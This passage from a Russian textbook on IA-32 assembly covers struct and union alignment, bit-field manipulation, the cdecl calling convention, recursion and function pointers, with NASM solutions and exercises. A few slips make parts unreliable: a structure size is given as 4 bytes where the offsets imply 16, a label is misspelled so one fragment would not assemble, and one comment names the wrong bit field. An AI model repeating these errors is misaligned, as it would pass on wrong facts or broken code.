     Первое поле i будет размещено в самом начале памяти, выделенной под структу-
     ру; смещение от начала у первого поля всегда 0. Сразу после него будет размещено
     поле c. Поскольку тип int занимает 4 байта, смещение, на котором окажется поле c
     – 4; занимает оно один байт, поскольку тип поля c – char. Следующее поле структу-
     ры (поле j) имеет тип int, его размер 4 байта. Расположено оно будет не сразу по-
     сле поля c, поскольку это нарушает правила выравнивания. Для типа int выравни-
     вание составляет 4 байта, поле j будет размещено на ближайшем смещении, без
     остатка делящимся на 4. В данном случае это будет смещение 8. Между полями c и
     j размещено 3 «пустых» байта с целью выравнивания. Последнее поле, поле d, бу-
     дет размещено сразу после поля j, поскольку его размер один байт (тип char), ни-
     какие правила выравнивания к однобайтовым полям не применяются. Таким об-
     разом, смещение поля d составит 12. Однако, после этого (последнего описанного
     в объявлении) поля будут размещены три байта, их цель – выровнять конец всей
     структуры по 4-байтной границе. Вся структура P будет занимать 4 байта, а смеще-
     ния ее полей будут следующие: 0, 4, 8, 12.




22
Пример 2-2 Структуры и объединения
Си-программа, использующая структуру figure, была скомпилирована на платфор-
ме IA-32/Windows.

  struct figure {
     int id;
     double scale;
     unsigned char type;
     union {
        void* opaque;
        unsigned char hash[4];
        int file;
     } sourceData;
     struct figure * thumb;
  };



Определите размер типа данных figure. Для каждого поля укажите его смещение
относительно начала структуры.

                                  Решение

Одним из полей структуры является представитель другого агрегатного типа – объ-
единения. В свою очередь, в объединении одним из полей является массив. Чтобы
определить правила размещения данных придется двигаться «изнутри наружу»,
поскольку правило выравнивания для агрегатного типа определяется как макси-
мум выравнивания всех его полей. В случае массива используется правило вырав-
нивания типа элемента массива, поэтому поле unsigned char hash[4] не создает ни-
каких требований к выравниванию. Вся память, выделенная для объединения
sourceData, используется полями совместно.




Все три поля занимают одни и те же 4 байта, дополнительных байтов в конце не
требуется, т. к. максимальные требования по выравниванию создаются полями
opaque и file.

Для всей структуры карта размещения полей выглядит следующим образом.


                                                                            23
     Перед полем scale необходим дополнительный промежуток для выравнивания по
     8-байтной границе, как того требуют правила компилятора Microsoft. Другие за-
     полняющие байты помещены перед полем sourceData (объединение требует вы-
     равнивания в 4 байта) и в конце структуры: наличие поля типа double требует, что-
     бы размер структуры был кратен 8.

     Пример 2-3 Структуры и объединения в x86_64
     Структура figure из Примера 2-2 была скомпилирована для 64-х разрядной маши-
     ны x86_64. Определите ее размер и смещения полей.

                                        Решение

     Существенное отличие будет заключаться в том, что размер указателей увеличится
     с 4 до 8 байтов. В первую очередь изменения затронут объединение sourceData.




     Поля hash и file по-прежнему занимают первые 4 байта, но указатель opaque требу-
     ет уже 8 байтов. Все объединение, поле sourceData, должно быть выровнено по
     границе в 8 байтов.

     Структура figure в результате увеличится в размере до 40 байтов.




     С 3 до 7 байтов будет увеличено заполнение перед полем sourceData, чтобы оно
     размещалось по смещению 24 (кратно 8). Размер поля-указателя thumb увеличится



24
до 8 байтов. Добавлять в конец структуры заполнители не придется, т. к. ее размер
сразу же оказывается кратен 8.

Работа с полями
При работе с массивом доступ к элементу требовал вычисления адреса в виде
база + смещение, где смещение = масштаб * индекс. В случае со структурой смещение
определятся при построении карты, так, как это было показано в примерах
2-1 – 2-3. Для всех полей объединения смещение нулевое.

Пример 2-4 Чтение и запись полей
Си-программа, использующая структуру creature, была скомпилирована на плат-
форме IA-32/Linux.

  typedef struct t_creature {                static creature grumpyCat;
     signed char kingdom;
     signed char phylum;                     grumpyCat.extremity.legs = 4;
     short        class;
     int          order;
     union {
         int legs;
         signed char wings;
         signed char flippers;               static p_creature velociraptor;
         signed short tentacles;             static double x;
     } extremity;
     double since;                           x = velociraptor->since;
  } creature, *p_creature;




Реализуйте приведенный выше Си-код на языке ассемблера.

                                   Решение

В первую очередь определяем размещение полей в структуре creature.




                                                                               25
     Если поля в структуре идут в порядке, когда размер не возрастает, то требования
     по выравниванию не усиливаются, что гарантированно обеспечивает размещение
     полей с минимальным числом байтов-заполнителей. Однако в каждом конкрет-
     ном случае возможности экономии зависят от набора полей. Например, в рассмат-
     риваемом примере размер полей, наоборот, не убывает. Тем не менее, промежут-
     ки вовсе отсутствуют, и общий размер структуры составляет 20 байтов.

       section .bss
          grumpyCat    resb 20 ; Выделяем память под всю структуру – 20 байтов
          velocitaptor resd 1 ; Для указателя необходимо 4 байта
          x            resq 1 ; Для double необходимо 8 байтов

       section .text
          mov dword [grumpyCat + 8], 4  ; Не забываем использовать спецификатор
                                        ; размера при пересылке констант
          mov eax, dword [velociraptor] ; Сперва загружаем указатель на регистр,
          mov edx, dword [eax+12]       ; после чего прибавляем к нему заранее
          mov dword [x], edx            ; известное смещение
          mov edx, dword [eax+16]
          mov dword [x+4], edx



     Поле extremity расположено по смещению в 8 байтов от начала структуры, все поля
     объединения extremity имеют такое же смещение.

     Во втором фрагменте кода происходит копирование 8 байтовых данных, для чего
     приходится выгружать поле since на регистр по частям два раза. Первый раз пере-
     сылались младшие байты, располагаемые в структуре по смещению в 12 байтов. У
     старших четырех байтов это смещение увеличивается на 4 и становится 16.

     Использование команд сопроцессора x87 позволит записать второй фрагмент кода
     более коротко.


26
   mov eax, dword [velociraptor]
   fld qword [eax+12]
   fstp qword [x]



Битовые поля
Если для целочисленного поля задан битовый размер, способ его размещения
стандартом языка Си не специфицирован и зависит от реализации компилятора.
Однако в большинстве случаев компиляторы стараются «запаковать» битовые по-
ля, уменьшив общий размер структуры.

Пример 2-5 Взведение и сброс отдельных битов
Дана структура omg. Пусть все три битовых поля размещены компилятором в рам-
ках одного 32-разрядного двойного слова, соответствующему типу int, в порядке
своего объявления в исходном тексте – от младших битов к старшим.

   struct omg {
          int a: 3;
          int b: 5;
          int c: 2;
   };



Требуется поместить в поле b значение, составленное из битов полей a и c (млад-
шие биты из поля a, старшие биты из поля c), в поле a – старшие 3 бита из поля b, в
поле c – младшие 2 бита из поля b.




                                                                               27
                                        Решение


       section .bss
           omg resd 1

       section .text
           mov eax, dword [omg]
           mov edx, eax
           and edx, 0x300 ; Выделяем поле c в edx
           shr edx, 2      ; Сдвигаем биты c на их место в результате
           mov ebx, eax
           shl ebx, 3      ; Сдвигаем биты a на их место в результате (еще
                           ; останутся другие биты)
           and ebx, 0x38   ; Убираем все биты кроме битов a
           or edx, ebx     ; Объединив биты a и c, получим новое
                           ; значение поля b на его месте
           mov ebx, eax
           and ebx, 0xe0   ; Выделяем старшие 3 бита поля b
           shr ebx, 5      ; Помещаем их на место - в поле a
           mov ecx, eax
           and ecx, 0x18   ; Выделяем младшие два бита поля b
           shl ecx, 5      ; Помещаем их на место поля a
           or ecx, ebx     ; Получаем новые значения полей a и c на их местах
           or edx, ecx     ; Получаем итоговый результат
           mov dword [omg], edx ; Сохраняем его в памяти




     Задачи

     Задача 2-1
     Пусть для хранения информации об успеваемости студентов определена структура:

       struct studentInfo {
          char name [25]; // ФИО
          int aver;       // средний балл за сессию
          int marks [5]; // оценки в сессию
       };

       static struct studentInfo st;



     Учитывая, что компиляция производится на платформе IA-32/Windows, выписать
     фрагмент ассемблерного кода для формирования значения поля st.aver.

     Задача 2-2
     Даны следующие объявления на языке Си:


28
  typedef struct t_personInfo {
     char name [20]; // ФИО
     char sex;       // пол ('m' для мужчин, 'w' для женщин)
     struct date {
        int day;
        int month;
        int year;
     } db;           // дата рождения
  } personInfo;

  static personInfo a[100];
  static int m;



Учитывая, что компиляция производится на платформе IA-32/Windows, выписать
фрагмент ассемблерного кода для печати из массива a ФИО всех женщин, день
рождения которых приходится на месяц m.

Задача 2-3
Пусть дата упакована в виде структуры date и все битовые поля структуры компиля-
тор располагает в рамках 16-ти разрядного слова в порядке их объявления в ис-
ходном тексте от младших разрядов к старшим.

  struct date {
     int day   : 5;
     int month : 4;
     int year : 7;
  };

  static struct date d1, d2;



Написать фрагмент ассемблерного кода для решения следующей задачи:

   а) в переменную d2 записать дату, непосредственно следующую за датой, за-
      писанной в переменной d1;
   б) напечатать 1, если дата d1 предшествует дате d2, и 0 в противном случае;
   в) напечатать 1, если дата d1 приходится на летний месяц, и 0 в противном слу-
      чае.

Задача 2-4
Сформулируйте достаточные требования для того, чтобы заданная структура или
объединение имели одинаковое расположение полей для всех рассматриваемых
платформ: 32- и 64-разрядных Windows и Linux.

Задача 2-5
Пусть даны статические массивы char *name[N], double height[N], double weight[N],
где name[i], height[i] и weight[i] задают имя, рост и вес i-го человека. Опишите


                                                                             29
     структуру struct person, которая позволит хранить всю информацию об одном че-
     ловеке, и реализуйте фрагмент ассемблерного кода, который заполняет массив
     struct person persons[N] по трем заданным массивам name, height и weight.

     Задача 2-6
     Даны следующие объявления на языке Си:

      struct swallow {
         int is_african : 1;
         int is_unladen : 1;
         double velocity;
         int id;
      };

      static struct swallow s[100];


     Считая, что компилятор под IA-32/Linux располагает битовые поля от младших би-
     тов в пределах 32-разрядного двойного слова, напишите на ассемблере фрагмент
     кода, который любым известным вам способом отсортирует массив s по неубыва-
     нию значений поля velocity.

     Задача 2-7
     Пусть массив s из задачи 2-6 уже отсортирован по возрастанию значений поля id и
     все эти значения различны. По заданному числу static int myid, которое гаранти-
     рованно встречается в массиве, найдите и напечатайте соответствующее значение
     is_unladen:

        а) используя линейный поиск;
        б) используя бинарный поиск.

     Задача 2-8
     Компилятор GCC позволяет при помощи атрибута структуры packed указать, что вы-
     равнивание полей в структуре не производится. В этом случае все поля структуры
     располагаются подряд. Этот синтаксис не входит в стандарт языка Си. Пусть даны
     две идентичные структуры sp и su, отличающиеся только наличием или отсутстви-
     ем этого атрибута.

      struct sp {                                struct su {
         char c;                                    char c;
         short s;                                   short s;
         int i;                                     int i;
      } __attribute__((packed));                 };

      struct sp sp_data;                         struct su su_data;


     Осуществите копирование значений из sp_data в su_data и обратно.



30
Задача 2-9
Даны следующие определения на языке Си:

 enum { RGB, CMYK };

 struct color
 {
    int type; // RGB или CMYK
    union
    {
       struct { double r, g, b; } rgb;
       struct { double c, m, y, k; } cmyk;
    } u;
 };

 static struct color clr;


Реализуйте фрагмент ассемблерной программы, который печатает YES, если в пе-
ременной clr записан белый цвет (RGB (1, 1, 1) или CMYK (0, 0, 0, 0)), и NO иначе.




                                                                              31
     3.    Организация вызова функций
     Аппаратный стек
     Архитектура IA-32 реализует поддержку аппаратного стека в памяти. Регистр ESP
     является указателем верхушки стека, команды PUSH и POP выполняют пересылку
     данных и сдвигают должным образом указатель верхушки стека. Стек растет вниз:
     при помещении новых данных на стек адрес верхушки уменьшается, при снятии
     данных – увеличивается. При выполнении 32-разрядного кода естественной еди-
     ницей данных на стеке является двойное слово. Принято изображать стек в виде
     «стопки» двойных слов.




     В каждый момент времени регистр ESP указывает на верхний элемент стека. Зада-
     вая положительное смещение относительно ESP, можно произвольным образом
     обращаться к содержимому стека. Отрицательные смещения относятся к свобод-
     ной памяти. После снятия данных со стека содержимое ячеек памяти не меняется,
     происходит только перемещение указателя стека. Но в рамках логики стека содер-
     жимое памяти, лежащей ниже того места, на которое ссылается ESP, не определе-
     но.

     Пример 3-1 Пересылки без MOV
     На стек помещено N > 1 целых чисел n0, n1, …, nN–1. Последний элемент последова-
     тельности – верхушка стека. Переместите n0 на верхушку стека так, чтобы в резуль-
     тате получилась следующая последовательность: n1, …, nN–1, n0. Дополнительные
     ограничения: (1) при пересылках данных из памяти или в память разрешается ис-
     пользовать только команды PUSH и POP, (2) не разрешается использовать дополни-
     тельную память.

                                       Решение

     Будем в цикле сдвигать на один шаг вниз по стеку (и вверх по адресам) элементы
     последовательности. Элемент i будет извлекаться, а на его место будет помещать-

32
ся элемент i+1. После того, как будет извлечен последний элемент (n0), переме-
стим указатель стека на конец последовательности и поместим его на верхушку
стека.

     mov ecx, N-1       ; В цикле должно выполниться N-1 записей на стек
     pop edx            ; В edx помещаем элемент i+1
   .l:                  ; Начинаем тело цикла
     pop eax            ; Выгружаем на eax элемент i
     push edx           ; На его место помещаем элемент i+1
     mov edx, eax       ; Перемещаем в edx элемент i
     add esp, 4         ; Принудительно передвигаем верхушку стека
     loop .l            ; Тело цикла выполняется N-1 раз
     sub esp, 4*(N-1)   ; Возвращаем указатель стека на последний элемент
     push edx           ; Кладем на верхушку стека n0



Соглашение вызова cdecl
Любое соглашение вызова функции должно определить, как будут использоваться
различными функциями регистры, способ передачи аргументов вызова и возвра-
щаемого значения и т. д. Основным соглашением вызова на платформе
IA-32/Linux является cdecl со следующими правилами.

Для вызова функции используется команда CALL fname, где операнд fname – метка
начала вызываемой функции. Для возврата в точку вызова – команда RET.

Для передачи аргументов вызова используется стек. Аргументы расположены в
«обратном» порядке: в момент вызова на верхушке стека находится первый аргу-
мент, следом за ним – второй и т. д. Для хранения аргументов используются двой-
ные слова. Например, для параметров типа char, short, int, long будет использовано
4 байта. Для типа long long – 8 байтов.

Возвращаемое значение передается в вызвавшую функцию через регистр EAX.

Автоматические локальные переменные размещаются на стеке, внутри фрейма
вызова функции. Если регистр ESP указывает на верхушку стека, что позволяет
определить нижнюю границу фрейма, то регистр EBP используется для определе-
ния верхней границы фрейма.

Регистры EAX, ECX, EDX при необходимости должны сохраняться перед вызовом в
вызывающей функции. Регистры EBX, ESI, EDI при необходимости должны сохра-
няться вызванной функцией. Для хранения используется память во фрейме вызова
функции (далее слово «вызов» будет опускаться для краткости изложения). Реги-
стры ESP и EBP используются для организации работы со стеком.

Код функции можно разделить на три части: пролог, тело функции и эпилог. В про-
логе и эпилоге происходит создание нового фрейма, сохранение прежнего значе-


                                                                              33
     ния EBP, в эпилоге освобождение фрейма и восстановление EBP. На рисунке приве-
     дено распределение памяти во фрейме, границы фрейма выделены жирными ли-
     ниями.




     Фрейм начинается с адреса возврата, помещенного на стек командой call. Сразу за
     ним расположен сохраненный регистр EBP, на это место памяти указывает новое
     значение, помещенное в EBP во время выполнения пролога. Далее в памяти распо-
     ложены (если есть такая необходимость) сохраняемые в вызванной функции реги-
     стры и автоматические локальные переменные. Нижняя часть фрейма отводится
     для аргументов вызова функций (если из данной функции что-либо вызывается).

     Пример 3-2 Скалярное произведение
     Используя соглашение cdecl, реализуйте функцию conv, вычисляющую скалярное
     произведение двух массивов длины len.

       int conv(int *a, int *b, int len);



                                        Решение

     Приведем рисунок, на котором будет показана структура фрейма функции conv.
     Над адресом возврата последовательно расположены три параметра. Их значения
     извлекаются из памяти через задание нужного смещения от регистра EBP. Под со-
     храненным указателем фрейма EBP расположены ячейки, в которых были сохране-


34
ны, а затем восстановлены значения регистров ESI и EDI. Указатель стека ESP пока-
зан на момент, когда расширенный сохранением регистров пролог закончился, и
началось выполнение тела функции.




Само вычисление скалярного произведения организовано следующим образом. В
регистре EAX, предварительно обнуленном, накапливается произведение. Для об-
ращения к элементам массива используются регистры ESI, EDI (базовые адреса
массивов) и ECX (счетчик цикла). Поскольку при вычислении скалярного произведе-
ния неважен порядок обхода элементов массивов, суммируем, начиная с больших
индексов.

  conv:
     push ebp
     mov ebp, esp            ; Стандартный пролог
     push esi                ; Сохраняем esi
     push edi                ; Сохраняем edi
     mov edi, dword [ebp+8] ; Извлекаем со стека первый параметр a
     mov esi, dword [ebp+12] ; Извлекаем со стека второй параметр b
     mov ecx, dword [ebp+16] ; Извлекаем со стека третий параметр len

     mov eax, 0               ; В eax будем накапливать скалярное произведение
   .l:
     mov edx, dword [edi+4*ecx-4]
     imul edx, dword [esi+4*ecx-4]
     add eax, edx
     loop .l

     pop   edi                ; Восстанавливаем сохраненный регистр edi
     pop   esi                ; Восстанавливаем сохраненный регистр esi
     mov   esp, ebp           ; Стандартный эпилог
     pop   ebp
     ret




                                                                                 35
     Для организации цикла была использована команда LOOP, диапазон изменения ре-
     гистра ECX – от len до 1. Поэтому к базовому адресу массива прибавляется смеще-
     ние вида 4*ECX-4, что обеспечивает обращение к индексам len-1 … 0.

     Пример 3-3 Рекурсивная функция
     Используя соглашение cdecl, реализуйте рекурсивную функцию int P(int n), вы-
     числяющую для неотрицательного n соответствующий элемент последовательно-
     сти Падована: P(0)  P(1)  P(2)  1, P(n)  P(n  2)  P(n  3) .

                                       Решение

     Поскольку функция рекурсивная, потребуется формировать фактические аргумен-
     ты вызова и сохранять во фрейме результат первого вызова, т. к. регистр EAX будет
     «разрушен» во время второго вызова.




     Во фрейме должно быть выделено 4 байта для сохранения результатов первого
     рекурсивного вызова, т. к. по соглашению cdecl регистр EAX может быть разрушен
     во время второго вызова. Помимо того, во фрейме необходимо выделить 4 байта
     под пространство аргументов (в данном случае для одного аргумента). Первый и
     второй вызовы будут последовательно использовать это пространство.




36
  P:
     push ebp                  ; Стандартный пролог
     mov ebp, esp
     sub esp, 8                ; Выделяем во фрейме еще два двойных слова
     mov eax, dword [ebp+8]    ; Загружаем параметр n в регистр
     cmp eax, 2                ; Для n большего 2 передаем управление на
     jg   .recur               ; метку .recur
     mov eax, 1                ; Остальные случаи: P(0)=P(1)=P(2)=1
     jmp .end                  ; Завершаем выполнение
   .recur:
     sub eax, 2                ; Помещаем в пространство аргументов величину n-2
     mov dword [esp], eax
     call P                    ; Выполняем первый рекурсивный вызов
     mov dword [ebp-4], eax    ; Сохраняем результат работы первого вызова
     mov eax, dword [ebp+8]    ; Помещаем в пространство аргументов величину n-3
     sub eax, 3
     mov dword [esp], eax
     call P                    ; Выполняем второй рекурсивный вызов
     add eax, dword [ebp-4]    ; Складываем P(n-2)+P(n-3)
   .end:
     mov esp, ebp              ; Стандартный эпилог
     pop ebp
     ret



Пример 3-4 Восстановление прототипа функции
Тело Си-функции f, использующей соглашение вызова cdecl, состоит из следующе-
го кода.

  *b = x;
  return c - y;



Компилятор сгенерировал для данного фрагмента следующий ассемблерный код.

  movsx ecx, byte [ebp+8]     ; (1)
  mov   eax, dword [ebp+16]   ; (2)
  mov   ebx, dword [ebp+20]   ; (3)
  mov   edx, dword [ebp+12]   ; (4)
  sub   eax, ecx              ; (5)
  mov   word [edx], bx        ; (6)



Восстановите прототип функции f.

                                      Решение

В приведенном фрагменте Си-кода фигурируют четыре переменные. Поскольку все
обращения к памяти используют положительные смещения относительно EBP (+8,
+12, …) можно утверждать, что в Си-коде присутствуют только формальные пара-
метры, автоматических локальных переменных не заводилось. Осталось опреде-


                                                                                   37
     лить в каком порядке параметры расположены, какие типы у параметров и воз-
     вращаемого функцией значения.

     Согласно соглашению, возвращаемое значение передается через регистр EAX. В ин-
     струкции 5 происходит вычитание (единственное в приведенном коде): из регистра
     EAX вычитают регистр ECX, что позволяет соотнести переменные c и y с теми значе-
     ниями, которые в этих регистрах в данный момент находятся. В инструкциях 1 и 2
     происходит загрузка значений на регистры из стека, используя смещения относи-
     тельно EBP +8 и +16. После стандартного пролога функции два верхних элемента
     фрейма содержат сохраненное значение регистра EBP и адрес возврата.




     Это позволяет определить, что первый параметр был загружен на регистр ECX, тре-
     тий – на регистр EAX. Совместив это с порядком операндов в инструкции вычитания,
     устанавливаем, что c – третий параметр, y – первый. Результирующее значение
     было получено операцией над 32-разрядными числами, но при загрузке первого
     параметра y было выполнено знаковое расширение с 8 до 32 разрядов. Однознач-
     но можно восстановить тип параметра y – это 8-разрядное знаковое число. Таким
     образом, первый параметр – signed char y. Тип третьего параметра однозначно
     восстановлен быть не может, вычитание допускает операнды как целых типов, так
     и указатели. У параметра c допустим тип int и любой тип-указатель. Тип возвраща-
     емого значения должен совпадать с типом параметра c.

     Оставшиеся инструкции 3, 4 и 6 реализуют присваивание *b = x;. Адрес, по кото-
     рому осуществляется запись, был помещен в инструкции 4 на регистр EDX. Чтение
     происходило из места расположения второго параметра (EBP+12), это означает, что
     b – второй параметр. Четвертый параметр (x) был загружен на регистр EBX в ин-
     струкции 3, после чего для последующей записи в памяти была использована толь-
     ко младшая половина BX. Это означает, что параметр b указывает на 16 разрядные


38
данные, которые не могут быть указателем, но могут быть как знаковыми, так и
беззнаковыми. Типом переменной x не может быть указатель, но может быть лю-
бой целочисленный тип разрядностью 16 или 32. Знаковость типов параметров x и
b может быть любой, в том числе и не совпадающей.

Итого, приведем один из допустимых прототипов функции f.

  int f(signed char y, short *b, int c, int x);



Пример 3-5 Нарушение соглашения вызова
Функция h использует соглашение cdecl. Найти ошибки в реализации, если они
есть, и объяснить их, указав, какие именно правила были нарушены.

  int h(int a, int b) {                       h:
     return a % b;                                 push ebp
  }                                                mov ebp, esp
                                                   mov edx, dword [ebp+8]
                                                   mov eax, edx
                                                   sar edx, 31
                                                   mov ebx, dword [ebp+12]
                                                   idiv ebx
                                                   pop ebp
                                                   ret



                                   Решение

По соглашению cdecl возвращаемое функцией значение передается через регистр
EAX. После выполнения инструкции IDIV в регистре EAX окажется результат деления,
а не взятия остатка. Для исправления данной ошибки необходимо добавить ин-
струкцию копирования регистра EDX в EAX. Помимо того, в вычислениях использует-
ся регистр EBX, прежнее значение которого не было сохранено. Следует либо доба-
вить сохранение и восстановление, либо отказаться от использования EBX. Напри-
мер, команда IDIV позволяет напрямую обращаться к памяти в своем явном опе-
ранде-делителе.

Вызов функций по указателю

Пример 3-6 Просто указатель
В статической переменной p хранится указатель на функцию, принимающей в каче-
стве параметров два числа типа short и возвращающей int. Реализуйте вызов
функции по указателю p на языке ассемблера, включая объявление переменной p.
Фактическими аргументами вызова являются числа 0x16 и 0x12. Для вызова функ-
ции используйте соглашение cdecl.


                                                                             39
                                             Решение


          section .bss                 ; Выделяем 4 байта под указатель
             p resd 1

          section .text
             sub esp, 8                ; Выделяем на стеке место для двух аргументов
             mov [esp], word 0x16      ; Кладем на стек первый аргумент
             mov [esp+4], word 0x12    ; Кладем на стек второй аргумент
             call dword [p]            ; Вызываем функцию по указателю p



     Пример 3-7 Массив в качестве возвращаемого значения
     Реализуйте приведенный Си-код, включая объявление переменной x. Для вызова
     функции используйте соглашение cdecl. Значение выражения поместите в регистр
     EAX.


          static short (*(*x)(int))[1870];
          ...
          (*(*x)(22))[4];



                                             Решение

     Основной сложностью задания является правильная интерпретация объявления
     переменной x. Первым рассматривается ключевое слово static, затем имя пере-
     менной и в порядке должного приоритета все операции, применяемые к имени
     переменной. Существуют открытые сервисы в сети Интернет, позволяющие пере-
     вести подобные объявления на естественный язык.
     static short (*(*x)(int))[1870]      x – статическая переменная
     static short (*(*x)(int))[1870]      x – статическая переменная, являющаяся указа-
                                          телем
     static short (*(*x)(int))[1870]      x – статическая переменная, являющаяся указа-
                                          телем на функцию, у которой один параметр ти-
                                          па int, а возвращаемое значение – указатель
     static short (*(*x)(int))[1870]      x – статическая переменная, являющаяся указа-
                                          телем на функцию, у которой один параметр ти-
                                          па int, а возвращаемое значение – указатель на
                                          массив из 1870 элементов
     static short (*(*x)(int))[1870]      x – статическая переменная, являющаяся указа-
                                          телем на функцию, у которой один параметр ти-
                                          па int, а возвращаемое значение – указатель на
                                          массив из 1870 элементов типа short


     
         http://www.cdecl.org


40
Стандарт Си не позволяет возвращать из функции массив, но можно вернуть указа-
тель на массив. К полученному значению можно сразу же применять операции ин-
дексирования и адресную арифметику.

Первое, что следует выполнить – вызов функции по указателю. Для этого необхо-
димо положить на стек фактический аргумент и выполнить команду CALL. В резуль-
тате в EAX будет помещен начальный адрес массива из 1870 элементов. Останется
только обратиться к 4-му элементу (смещение +8) и расширить его до 32 разрядов.

  section .bss
     x resd 1
  section .text
     push dword 22
     call dword [x]
     movsx eax, word [eax+8]



Пример 3-8 Функциональный тип у возвращаемого значения
Реализуйте приведенный Си-код. Для вызова функции используйте соглашение
cdecl. Значение выражения поместите в регистр EAX.

  static int index, param;
  int (*(*f())[256])(int);
  ...
  (*f())[index](param);




                                 Решение

Как в предыдущей задаче, начать следует с интерпретации объявления перемен-
ной f. То, что переменная – статическая, будет опущено.




                                                                           41
     int (*(*f())[256])(int)   Объявлена функция f()
     int (*(*f())[256])(int)   Объявлена функция f(), возвращающая указатель
     int (*(*f())[256])(int)   Объявлена функция f(), возвращающая указатель на мас-
                               сив из 256 элементов
     int (*(*f())[256])(int)   Объявлена функция f(), возвращающая указатель на мас-
                               сив из 256 элементов, тип которых – указатели
     int (*(*f())[256])(int)   Объявлена функция f(), возвращающая указатель на мас-
                               сив из 256 элементов, тип которых – указатели на функции
                               с одним параметром типа int
                               Объявлена функция f(), возвращающая указатель на мас-
     int (*(*f())[256])(int)
                               сив из 256 элементов, тип которых – указатели на функции
                               с одним параметром типа int и возвращающие int


     Таким образом, вычисляющееся выражение представляет собой вызов функции f.
     То, что она вернет – адрес массива, в котором надо выбрать элемент с номером
     index. Выбранный элемент – указатель на функцию, для вызова которой необходи-
     мо передать ей параметр param. Другими словами, f() возвращает таблицу функ-
     ций, требуется вызвать функцию с заданным индексом и параметром.

          call f                 ; В eax базовый адрес массива указателей на функции
          mov edx, dword [param] ; Кладем на стек переменную param
          mov dword [esp], edx
          mov edx, dword [index] ; В edx помещаем index
          call dword [eax+edx*4] ; Вызываем функцию из таблицы



     Использование библиотечных функций
     Выполнение правил, заданных в соглашении вызова, позволяет пользоваться не
     только своим кодом, но и любыми другими функциями. Однако требуется совер-
     шить дополнительные действия: (1) объявить внешнюю (не определенную в дан-
     ном файле) метку кода, на которую будет передавать управление команда CALL,
     (2) выровнять фрейм по 16-байтной границе, (3) при сборке исполняемой про-
     граммы включить код библиотечной функции.

     Объявление внешних библиотечных функций в ассемблерном коде требует знания
     правил перевода имен функций из языка высокого уровня в имена меток. К сча-
     стью, для языка Си и платформы Linux/IA-32 это правило тривиально – имя функ-
     ции никак не меняется, достаточно задать директиву extern fname, где fname – имя
     нужной функции. Для 32-битных версий Darwin (Mac OS X) и Windows правило пе-
     ревода отличается: Си-функции fname будет соответствовать метка с именем _fname.


42
Для того, чтобы добиться соответствия правилам перевода для целевой платфор-
мы не изменяя кода ассемблерной программы, в nasm предусмотрен ключ --prefix
(--gprefifx), с помощью которого можно приписать символ подчеркивания ко
всем глобальным и внешним меткам ассемблерного модуля во время трансляции.
Этой возможностью пользуется учебный скрипт build_asm.sh1.

Цель выравнивания – улучшение производительности программы, поскольку чте-
ние выровненных данных может выполняться быстрее. Компилятор gcc произво-
дит выравнивание границ фрейма по кратным 16 адресам, статически распределяя
в нем память под переменные, сохраняемые значения и аргументы вызова. По-
следним (с наибольшим адресом) двойным словом во фрейме является адрес воз-
врата. Помимо того, стандартный пролог сохраняет регистр EBP. Таким образом,
размер дополнительно выделяемой под фрейм памяти берется как минимальное
допустимое число из ряда 8, 24, 40, …

Последняя задача – включение библиотечных функций в исполняемый код. Скрипт
сборки учебных программ build_asm.sh включает в исполняемую программу стан-
дартную библиотеку языка Си, что позволяет свободно вызывать любые функции
этой библиотеки (при соблюдении перечисленных правил). Вопрос включения ко-
да произвольных библиотек в собираемую программу в данном разделе не рас-
сматривается.

Некоторые функции стандартной библиотеки используют параметры типа FILE*.
Предопределенные переменные этого типа, связанные со стандартным входом и
выходом, доступны через вызов Си-функций

    FILE *get_stdin(void);
    FILE *get_stdout(void);



Объявление и подключение кода этих функций к исполняемой программе обеспе-
чивается скриптом build_asm.sh.

Пример 3-9 Динамическая память и переменное число параметров
Реализуйте на языке ассемблера функцию, перемещающую целые числа, свои па-
раметры, в динамическую память.

    int* dynamo(int n, ...);




1
 И среда SASM с настройками по умолчанию. Ее функциональность включает возможности учебного скрип-
та, поэтому в дальнейшем мы не будем оговаривать это отдельно.


                                                                                              43
     У функции dynamo переменное число параметров. Первый параметр – число идущих
     следом целых чисел. Для этих чисел выделяется динамическая память, куда они
     копируются. Возвращаемое значение – адрес выделенной динамической памяти.
     Если параметр n равен 0 возвращается NULL. Считать, что при вызове функции dynamo
     стек уже выровнен на границе в 16 байтов.

                                       Решение

     Первый параметр вызванной функции размещен по адресу EBP+8. Адреса следую-
     щих параметров будут идти следом за ним с шагом в 4 байта:
     EBP+8+4*(i-1), где i – номер параметра, при нумерации параметров функции начи-
     ная с 1.

     Особенностью кода будет то, что вызов функции malloc необходимо будет выпол-
     нять на выровненном фрейме. Для остальных действий будет достаточно трех ре-
     гистров, поэтому закажем на стеке 8 байтов, чтобы суммарный объем стека соста-
     вил 16 байтов. Из этих 8 байтов 4 байта на верхушке стека потребуются для вызова
     функции malloc, другие 4 байта в вычислениях не принимают участия и использу-
     ются исключительно для выравнивания стека. Границы выровненного 16-байтного
     фрейма показаны на рисунке жирными линиями.




44
   section .text
   dynamo:
      push    ebp                ; Пролог
      mov     ebp, esp
      mov     eax, dword [ebp+8] ; Проверяем не нулевое ли количество элементов
      test    eax, eax           ; было передано
      jz      .end
      sub     esp, 8             ; Выделяем 8 байт во фрейме
      sal     eax, 2             ; Переводим элементы в байты
      mov     dword [esp], eax   ; Кладем нужное число байт на стек
      call    malloc             ; и вызываем malloc. Теперь eax - адрес буфера
      mov     ecx, dword [ebp+8] ; Снова берем число элементов. Оно не нулевое.
      lea     esp, [ebp+12]      ; Временно переставляем указатель стека на
                                 ; последовательность чисел-параметров
      xor     edx, edx           ;
   .copy:                        ;
      pop     dword [eax+4*edx] ; n раз выталкиваем в буфер содержимое со стека
      inc     edx                ; Явно сдвигать надо только edx
      loop    .copy
      mov     esp, ebp           ; Возвращаем указатель стека на место
    .end:
      pop     ebp                ; Эпилог
      ret



Замечание. Показанный прием следует рассматривать как «hack» в изначальном
смысле этого термина, но более уместен здесь термин «kludge»: проблема реша-
ется с нарушением правил, но, тем не менее, код работает и, возможно, имеет ка-
кие-то преимущества, например, занимает меньше места, быстрее выполняется. В
данном случае особенностью является то, что не используются регистры, требую-
щие сохранения (EBX, ESI, EDI) и тело цикла занимает всего 6 байтов: 8f 04 90 42 e2 fa.
Важно понимать, что приведенный код нарушает принятый порядок работы с ре-
гистром ESP. Перестановка указателя стека на произвольные пользовательские
данные может вызывать проблемы при работе отладчика. В случае возникновения
ошибки нет никакой гарантии, что отладчик будет давать корректную диагностику.

Пример 3-10 Стандартный ввод/вывод своими силами
Реализовать на языке ассемблера заданную Си-функцию f.

